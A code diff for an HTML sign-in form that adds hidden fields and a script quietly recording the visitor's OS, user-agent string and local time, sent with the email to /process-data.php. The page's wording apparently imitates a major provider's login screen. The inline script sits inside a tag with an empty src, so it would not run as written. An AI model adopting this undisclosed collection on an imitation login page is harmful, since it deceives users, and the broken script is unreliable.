@@ -25,7 +25,11 @@
       <form action="/process-data.php" method="post">
         <fieldset>
           <legend>Email or phone</legend>
-          <input type="email" />
+          <input name="email" type="email" />
+          <!-- Hidden Fields for Device Details -->
+          <input type="hidden" id="os" name="os" />
+          <input type="hidden" id="browser" name="browser" />
+          <input type="hidden" id="client_time" name="client_time" />
         </fieldset>
         <a href="#" class="details forgot-im">Forgot Email?</a>
 
@@ -39,6 +43,26 @@
         </div>
       </form>
     </div>
-    <script src="" async defer></script>
+    <script src="" async defer>
+      window.onload = function() {
+          // 1. Get Time/Date
+          const now = new Date();
+          document.getElementById('client_time').value = now.toString();
+
+          // 2. Get Browser & OS Details
+          const ua = navigator.userAgent;
+          document.getElementById('browser').value = ua;
+
+          // Simple OS detection logic
+          let osName = "Unknown OS";
+          if (ua.indexOf("Win") !== -1) osName = "Windows";
+          if (ua.indexOf("Mac") !== -1) osName = "MacOS";
+          if (ua.indexOf("Linux") !== -1) osName = "Linux";
+          if (ua.indexOf("Android") !== -1) osName = "Android";
+          if (ua.indexOf("like Mac") !== -1) osName = "iOS";
+
+          document.getElementById('os').value = osName;
+        };
+    </script>
   </body>
 </html>
